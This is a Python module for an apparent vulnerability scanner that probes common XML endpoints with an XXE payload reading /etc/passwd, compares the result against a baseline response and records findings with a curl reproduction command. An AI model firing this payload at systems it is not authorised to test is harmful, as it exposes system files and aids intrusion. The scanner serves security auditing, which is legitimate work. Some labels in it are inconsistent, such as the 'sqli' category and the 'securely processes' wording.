import scan_engine.helpers.http_client as http_client
import json

class XXEScanner:
    def __init__(self, target, options=None):
        self.options = options
        self.target = target

    def scan_xxe(self, port, protocol='http', logger=None):
        findings = []
        base_url = f"{protocol}://{self.target}:{port}"
        
        # XXE Payload aiming to read /etc/passwd or similar
        payload = """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>"""

        if logger: logger(f"🕷️ XXE Audit: Testing XML endpoints on {base_url}...", "INFO")
        
        endpoints = ["/api/xml", "/soap", "/xmlrpc", "/data", "/rpc", "/xml"]

        for ep in endpoints:
            try:
                target_url = base_url + ep
                
                # 0. Baseline (GET/POST without payload)
                try:
                    baseline_r = http_client.post(target_url, options=getattr(self, "options", None), data="<root>test</root>", headers={'Content-Type': 'application/xml'}, timeout=3)
                    baseline_text = baseline_r.text if baseline_r.status_code == 200 else ""
                except:
                    baseline_text = ""

                headers = {'Content-Type': 'application/xml', 'Accept': 'application/xml'}
                r = http_client.post(target_url, options=getattr(self, "options", None), data=payload, headers=headers, timeout=5)
                
                if not r or not hasattr(r, 'text'):
                    continue

                # Differential signature check to avoid false positives
                sigs = ["root:x:0:0", "bin/bash", "/sbin/nologin", "boot loader", "[extensions]"]
                hit = False
                proof_snippet = ""
                
                for sig in sigs:
                    if sig in r.text and sig not in baseline_text:
                        hit = True
                        # Extract the line containing the signature for proof
                        for line in r.text.split('\n'):
                            if sig in line:
                                proof_snippet = line.strip()[:200]
                                break
                        break

                if hit:
                    curl_cmd = f"curl -X POST \"{target_url}\" -H \"Content-Type: application/xml\" -d '{payload}'"
                    
                    from scan_engine.helpers.finding_normalizer import FindingNormalizer
                    findings.append(FindingNormalizer.from_response(
                        r,
                        title="XML External Entity (XXE) Injection",
                        description=f"The endpoint `{target_url}` securely processes XML but fails to disable external entities.\nBy injecting an entity pointing to `file:///etc/passwd`, we successfully read local system files.\n\n**Differential Analysis:** The signature was entirely absent from the baseline response but appeared when the malicious DTD was submitted.",
                        severity="critical",
                        confidence="certain",
                        tool_source="xxe_scanner",
                        category="sqli", # Using sqli/injection icon logically
                        payload=payload,
                        evidence={
                            "proof": proof_snippet,
                            "baseline_diff": "Signature not found in baseline."
                        },
                        repro_command=curl_cmd,
                        metadata={
                            "validation_status": "success",
                            "port": port,
                            "protocol": protocol,
                            "component": "XML Parser"
                        }
                    ))
                    if logger: logger(f"💀 XXE CONFIRMED: {target_url}", "CRITICAL")
                    
            except Exception as e:
                pass
                
        return findings
